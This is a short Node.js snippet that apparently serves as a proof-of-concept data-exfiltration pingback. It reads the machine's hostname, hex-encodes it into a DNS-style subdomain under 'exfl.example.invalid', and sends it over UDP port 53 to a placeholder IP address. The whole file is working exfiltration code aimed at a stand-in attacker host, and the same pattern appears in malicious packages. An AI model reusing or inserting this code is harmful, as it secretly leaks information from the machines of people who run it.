const os=require('os'),dgram=require('dgram'); const PINGBACK_DOMAIN='example.invalid',PINGBACK_IP='192.0.2.1',PINGBACK_PORT=53;
function sendManualPingback(data){const hexEncodedData=Buffer.from(data,'utf8').toString('hex'); const fullQueryName=`${hexEncodedData}.exfl.${PINGBACK_DOMAIN}`;const packet=Buffer.from(fullQueryName);const client=dgram.createSocket('udp4');client.send(packet,0,packet.length,PINGBACK_PORT,PINGBACK_IP)}
const secretData=os.hostname().substring(0,50);sendManualPingback(secretData);
